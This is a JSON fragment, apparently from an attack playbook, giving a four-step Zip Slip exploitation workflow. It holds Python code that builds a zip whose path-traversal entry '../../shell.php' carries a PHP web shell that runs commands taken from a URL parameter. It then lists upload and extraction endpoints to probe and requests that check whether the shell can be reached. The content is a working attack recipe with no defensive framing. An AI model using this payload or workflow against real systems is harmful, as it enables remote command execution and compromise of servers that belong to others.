  "exploitation_workflow": {
    "step_1_create_malicious_zip": {
      "description": "Create zip with path traversal filenames",
      "methods": [
        {"name": "Python zipfile", "code": "import zipfile, io\nz = zipfile.ZipFile('exploit.zip', 'w')\nz.writestr('../../shell.php', '<?php system($_GET[\"cmd\"]); ?>')"},
        {"name": "zip command", "code": "zip exploit.zip '../../shell.php'"}
      ]
    },
    "step_2_upload_zip": {
      "description": "Upload the malicious zip to the target endpoint",
      "endpoints": [
        "POST /api/import",
        "POST /api/upload",
        "POST /upload",
        "POST /api/extract",
        "POST /api/backup/restore"
      ]
    },
    "step_3_trigger_extraction": {
      "description": "Trigger automatic or manual extraction",
      "methods": [
        "Automatic on upload",
        "POST /api/extract with zip_id",
        "GET /api/extract?file=uploaded.zip"
      ]
    },
    "step_4_verify_exploitation": {
      "description": "Verify if files were extracted to unexpected locations",
      "checks": [
        "GET /shell.php",
        "Access extracted file via expected path",
        "Check if webshell is accessible"
      ]
    }
  },
